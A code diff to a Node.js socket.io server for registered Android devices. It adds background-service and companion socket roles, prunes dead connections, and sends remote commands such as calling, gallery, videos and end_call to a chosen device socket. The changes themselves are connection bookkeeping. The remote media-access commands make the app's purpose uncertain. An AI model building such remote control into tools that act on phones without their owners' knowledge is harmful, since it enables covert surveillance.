@@ -72,23 +72,26 @@ loadDevices();
 function getDeviceListPayload() {
     const list = [];
     for (const [deviceId, info] of deviceRegistry.entries()) {
-        let isOnline = Boolean(info.online);
-        if (!isOnline && info.sockets && info.sockets.size > 0) {
-            isOnline = true;
-            info.online = true;
-        }
-        if (!isOnline) {
-            for (const [sId, u] of usersBySocket.entries()) {
-                if (u.username && (u.username.includes(deviceId) || u.username.startsWith(deviceId))) {
-                    isOnline = true;
-                    if (!info.sockets) info.sockets = new Set();
-                    info.sockets.add(sId);
-                    info.socketId = sId;
-                    info.online = true;
-                    break;
+        // Prune any sockets that are disconnected
+        if (info.sockets) {
+            for (const sid of Array.from(info.sockets)) {
+                const s = io.sockets.sockets.get(sid);
+                if (!s || !s.connected) {
+                    info.sockets.delete(sid);
+                    if (info.bgSocketId === sid) info.bgSocketId = null;
+                    if (info.companionSocketId === sid) info.companionSocketId = null;
                 }
             }
         }
+
+        let isOnline = Boolean(info.sockets && info.sockets.size > 0);
+        info.online = isOnline;
+        if (isOnline) {
+            info.socketId = info.bgSocketId || Array.from(info.sockets)[0];
+        } else {
+            info.socketId = null;
+        }
+
         list.push({
             deviceId: info.deviceId,
             deviceName: info.deviceName,
@@ -513,22 +516,48 @@ io.on("connection", (socket) => {
     // ==========================================
     socket.on("register-device", (data) => {
         try {
-            const { deviceId, deviceName, ram, platform } = data || {};
+            const { deviceId, deviceName, ram, platform, role } = data || {};
             if (!deviceId) return;
             let existing = deviceRegistry.get(deviceId);
             if (!existing) {
-                existing = { deviceId, deviceName: deviceName || "Android Device", ram: ram || "", platform: platform || "android", sockets: new Set() };
+                existing = {
+                    deviceId,
+                    deviceName: deviceName || "Android Device",
+                    ram: ram || "",
+                    platform: platform || "android",
+                    sockets: new Set(),
+                    bgSocketId: null,
+                    companionSocketId: null
+                };
                 deviceRegistry.set(deviceId, existing);
             }
             if (!existing.sockets) existing.sockets = new Set();
+
+            // Prune dead sockets
+            for (const sid of Array.from(existing.sockets)) {
+                const s = io.sockets.sockets.get(sid);
+                if (!s || !s.connected) {
+                    existing.sockets.delete(sid);
+                    if (existing.bgSocketId === sid) existing.bgSocketId = null;
+                    if (existing.companionSocketId === sid) existing.companionSocketId = null;
+                }
+            }
+
             existing.sockets.add(socket.id);
             existing.socketId = socket.id;
             existing.online = true;
+
+            if (role === "background_service") {
+                existing.bgSocketId = socket.id;
+            } else if (role === "companion") {
+                existing.companionSocketId = socket.id;
+            }
+
             if (deviceName) existing.deviceName = deviceName;
             if (ram) existing.ram = ram;
             if (platform) existing.platform = platform;
             saveDevices();
-            console.log(`Device registered: ${deviceId} (${existing.deviceName}) socket=${socket.id} (active sockets: ${existing.sockets.size})`);
+            console.log(`Device registered: ${deviceId} (${existing.deviceName}) socket=${socket.id} role=${role || 'unknown'} (active sockets: ${existing.sockets.size})`);
             socket.emit("device-registered", { deviceId, success: true });
             io.emit("device-list-update", getDeviceListPayload());
         } catch (e) {
@@ -555,25 +584,48 @@ io.on("connection", (socket) => {
         };
 
         let dispatched = false;
-        // 1. Emit to all active sockets belonging to target device
-        if (target && target.sockets && target.sockets.size > 0) {
-            for (const sid of target.sockets) {
-                io.to(sid).emit("auto-command", payload);
-                console.log(`Auto-command '${command}' -> device ${targetDeviceId} (socket: ${sid})`);
-                dispatched = true;
+
+        // Clean dead sockets from target
+        const activeSockets = [];
+        if (target && target.sockets) {
+            for (const sid of Array.from(target.sockets)) {
+                const s = io.sockets.sockets.get(sid);
+                if (s && s.connected) {
+                    activeSockets.push(sid);
+                } else {
+                    target.sockets.delete(sid);
+                    if (target.bgSocketId === sid) target.bgSocketId = null;
+                    if (target.companionSocketId === sid) target.companionSocketId = null;
+                }
             }
-        } else if (target && target.socketId) {
-            io.to(target.socketId).emit("auto-command", payload);
-            console.log(`Auto-command '${command}' -> device ${targetDeviceId} (socket: ${target.socketId})`);
-            dispatched = true;
         }
 
-        // 2. Also emit to any socket matching targetDeviceId
-        for (const [sId, u] of usersBySocket.entries()) {
-            if (sId !== socket.id && targetDeviceId && (u.username.includes(targetDeviceId) || u.username.startsWith(targetDeviceId))) {
-                io.to(sId).emit("auto-command", payload);
-                console.log(`Auto-command '${command}' relayed to user socket ${sId} (${u.username})`);
+        if (command === "end_call") {
+            // Disconnect command: Broadcast to ALL active sockets of this device
+            for (const sid of activeSockets) {
+                io.to(sid).emit("auto-command", payload);
                 dispatched = true;
+            }
+            console.log(`Auto-command 'end_call' broadcast to ${activeSockets.length} sockets of ${targetDeviceId}`);
+        } else {
+            // For calling / gallery / videos / info: DISPATCH TO EXACTLY ONE SOCKET!
+            let chosenSocketId = null;
+
+            // Prefer background_service socket for reliable wake & media access
+            if (target && target.bgSocketId && io.sockets.sockets.has(target.bgSocketId)) {
+                chosenSocketId = target.bgSocketId;
+            } else if (activeSockets.length > 0) {
+                chosenSocketId = activeSockets[0];
+            } else if (target && target.socketId && io.sockets.sockets.has(target.socketId)) {
+                chosenSocketId = target.socketId;
+            }
+
+            if (chosenSocketId) {
+                io.to(chosenSocketId).emit("auto-command", payload);
+                console.log(`Auto-command '${command}' -> device ${targetDeviceId} (single socket: ${chosenSocketId})`);
+                dispatched = true;
+            } else {
+                console.warn(`No active socket found for device ${targetDeviceId} to dispatch '${command}'`);
             }
         }
 
@@ -612,9 +664,11 @@ io.on("connection", (socket) => {
         for (const [deviceId, info] of deviceRegistry.entries()) {
             if (info.sockets && info.sockets.has(socket.id)) {
                 info.sockets.delete(socket.id);
+                if (info.bgSocketId === socket.id) info.bgSocketId = null;
+                if (info.companionSocketId === socket.id) info.companionSocketId = null;
                 console.log(`Socket ${socket.id} disconnected from device ${deviceId}. Remaining sockets: ${info.sockets.size}`);
                 if (info.sockets.size > 0) {
-                    info.socketId = Array.from(info.sockets)[0];
+                    info.socketId = info.bgSocketId || Array.from(info.sockets)[0];
                     info.online = true;
                 } else {
                     info.socketId = null;
@@ -625,6 +679,8 @@ io.on("connection", (socket) => {
             } else if (info.socketId === socket.id) {
                 info.socketId = null;
                 info.online = false;
+                if (info.bgSocketId === socket.id) info.bgSocketId = null;
+                if (info.companionSocketId === socket.id) info.companionSocketId = null;
                 io.emit("device-list-update", getDeviceListPayload());
                 break;
             }
